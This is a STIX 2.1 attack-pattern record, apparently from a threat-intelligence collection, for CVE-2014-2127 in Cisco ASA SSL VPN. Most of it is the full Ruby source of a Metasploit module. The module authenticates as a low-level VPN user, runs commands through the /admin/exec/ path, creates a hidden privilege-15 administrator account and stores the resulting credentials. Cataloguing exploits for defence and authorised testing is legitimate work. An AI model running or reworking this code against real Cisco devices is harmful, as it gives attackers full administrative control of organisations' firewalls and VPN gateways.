{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--279f584d-d660-4885-9c50-e73a807b6142",
    "created": "2024-08-14T16:29:31.430405Z",
    "modified": "2024-08-14T16:29:31.430408Z",
    "name": "Cisco ASA SSL VPN Privilege Escalation Vulnerability",
    "description": " This module exploits a privilege escalation vulnerability for Cisco ASA SSL VPN (aka: WebVPN). It allows level 0 users to escalate to level 15. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/cisco_ssl_vpn_priv_esc.rb",
            "external_id": "cisco_ssl_vpn_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-2127"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140409-asa"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18908"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Cisco ASA SSL VPN Privilege Escalation Vulnerability',\n      'Description' => %q{\n        This module exploits a privilege escalation vulnerability for Cisco\n        ASA SSL VPN (aka: WebVPN). It allows level 0 users to escalate to\n        level 15.\n      },\n      'Author'       =>\n        [\n          'jclaudius <jclaudius[at]trustwave.com>',\n          'lguay <laura.r.guay[at]gmail.com>'\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          ['CVE', '2014-2127'],\n          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140409-asa'],\n          ['URL', 'https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18908']\n        ],\n      'DisclosureDate' => '2014-04-09',\n      'DefaultOptions' => { 'SSL' => true }\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('USERNAME', [true, \"A specific username to authenticate as\", 'clientless']),\n        OptString.new('PASSWORD', [true, \"A specific password to authenticate with\", 'clientless']),\n        OptString.new('GROUP', [true, \"A specific VPN group to use\", 'clientless']),\n        OptInt.new('RETRIES', [true, 'The number of exploit attempts to make', 10])\n      ], self.class\n    )\n\n  end\n\n  def validate_cisco_ssl_vpn\n    begin\n      res = send_request_cgi(\n              'uri' => '/',\n              'method' => 'GET'\n            )\n\n      vprint_good(\"Server is responsive\")\n    rescue ::Rex::ConnectionError, ::Errno::EPIPE\n      return false\n    end\n\n    res = send_request_cgi(\n            'uri' => '/+CSCOE+/logon.html',\n            'method' => 'GET'\n          )\n\n    if res &&\n       res.code == 302\n\n      res = send_request_cgi(\n              'uri' => '/+CSCOE+/logon.html',\n              'method' => 'GET',\n              'vars_get' => { 'fcadbadd' => \"1\" }\n            )\n    end\n\n    if res &&\n       res.code == 200 &&\n       res.body.include?('webvpnlogin')\n      return true\n    else\n      return false\n    end\n  end\n\n  def do_logout(cookie)\n    res = send_request_cgi(\n            'uri' => '/+webvpn+/webvpn_logout.html',\n            'method' => 'GET',\n            'cookie' => cookie\n          )\n\n    if res &&\n       res.code == 200\n      vprint_good(\"Logged out\")\n    end\n  end\n\n  def run_command(cmd, cookie)\n    reformatted_cmd = cmd.gsub(/ /, \"+\")\n\n    res = send_request_cgi(\n            'uri'       => \"/admin/exec/#{reformatted_cmd}\",\n            'method'    => 'GET',\n            'cookie'    => cookie\n          )\n\n    res\n  end\n\n  def do_show_version(cookie, tries = 3)\n    # Make up to three attempts because server can be a little flaky\n    tries.times do |i|\n      command = \"show version\"\n      resp = run_command(command, cookie)\n\n      if resp &&\n         resp.body.include?('Cisco Adaptive Security Appliance Software Version')\n        return resp.body\n      else\n        vprint_error(\"Unable to run '#{command}'\")\n        vprint_good(\"Retrying #{i} '#{command}'\") unless i == 2\n      end\n    end\n\n    return nil\n  end\n\n  def add_user(cookie, tries = 3)\n    username = Rex::Text.rand_text_alpha_lower(8)\n    password = Rex::Text.rand_text_alphanumeric(20)\n\n    tries.times do |i|\n      vprint_good(\"Attemping to add User: #{username}, Pass: #{password}\")\n      command = \"username #{username} password #{password} privilege 15\"\n      resp = run_command(command, cookie)\n\n      if resp &&\n         !resp.body.include?('Command authorization failed') &&\n         !resp.body.include?('Command failed')\n        vprint_good(\"Privilege Escalation Appeared Successful\")\n        return [username, password]\n      else\n        vprint_error(\"Unable to run '#{command}'\")\n        vprint_good(\"Retrying #{i} '#{command}'\") unless i == tries - 1\n      end\n    end\n\n    return nil\n  end\n\n  def do_login(user, pass, group)\n    begin\n      cookie = \"webvpn=; \" +\n               \"webvpnc=; \" +\n               \"webvpn_portal=; \" +\n               \"webvpnSharePoint=; \" +\n               \"webvpnlogin=1; \" +\n               \"webvpnLang=en;\"\n\n      post_params = {\n        'tgroup' => '',\n        'next' => '',\n        'tgcookieset' => '',\n        'username' => user,\n        'password' => pass,\n        'Login' => 'Logon'\n      }\n\n      post_params['group_list'] = group unless group.empty?\n\n      resp = send_request_cgi(\n              'uri' => '/+webvpn+/index.html',\n              'method'    => 'POST',\n              'ctype'     => 'application/x-www-form-urlencoded',\n              'cookie'    => cookie,\n              'vars_post' => post_params\n            )\n\n      if resp &&\n         resp.code == 200 &&\n         resp.body.include?('SSL VPN Service') &&\n         resp.body.include?('webvpn_logout')\n\n        vprint_good(\"Logged in with User: #{datastore['USERNAME']}, Pass: #{datastore['PASSWORD']} and Group: #{datastore['GROUP']}\")\n        return resp.get_cookies\n      else\n        return false\n      end\n\n    rescue ::Rex::ConnectionError, ::Errno::EPIPE\n      return false\n    end\n  end\n\n  def run_host(ip)\n    # Validate we're dealing with Cisco SSL VPN\n    unless validate_cisco_ssl_vpn\n      vprint_error(\"Does not appear to be Cisco SSL VPN\")\n      return\n    end\n\n    # This is crude, but I've found this to be somewhat\n    # interimittent based on session, so we'll just retry\n    # 'X' times.\n    datastore['RETRIES'].times do |i|\n      vprint_good(\"Exploit Attempt ##{i}\")\n\n      # Authenticate to SSL VPN and get session cookie\n      cookie = do_login(\n                 datastore['USERNAME'],\n                 datastore['PASSWORD'],\n                 datastore['GROUP']\n               )\n\n      # See if our authentication attempt failed\n      unless cookie\n        vprint_error(\"Failed to login to Cisco SSL VPN\")\n        next\n      end\n\n      # Grab version\n      version = do_show_version(cookie)\n\n      if version &&\n         version_match = version.match(/Cisco Adaptive Security Appliance Software Version ([\\d+\\.\\(\\)]+)/)\n        print_good(\"Show version succeeded. Version is Cisco ASA #{version_match[1]}\")\n      else\n        do_logout(cookie)\n        vprint_error(\"Show version failed\")\n        next\n      end\n\n      # Attempt to add an admin user\n      creds = add_user(cookie)\n      do_logout(cookie)\n\n      if creds\n        print_good(\"Successfully added level 15 account #{creds.join(\", \")}\")\n        user, pass = creds\n        report_escalated_creds(user, pass)\n      else\n        vprint_error(\"Failed to created user account on Cisco SSL VPN\")\n      end\n    end\n  end\n\n  def report_escalated_creds(username, password)\n    status = Metasploit::Model::Login::Status::SUCCESSFUL\n\n    service_data = {\n        address: rhost,\n        port: rport,\n        service_name: 'https',\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n        origin_type: :service,\n        module_fullname: self.fullname,\n        private_type: :password,\n        private_data: password,\n        username: username\n    }\n\n    credential_data.merge!(service_data)\n    credential_core = create_credential(credential_data)\n    login_data = {\n        core: credential_core,\n        access_level: 'Level 15',\n        status: status,\n        last_attempted_at: DateTime.now\n    }\n    login_data.merge!(service_data)\n    create_credential_login(login_data)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-04-09"
}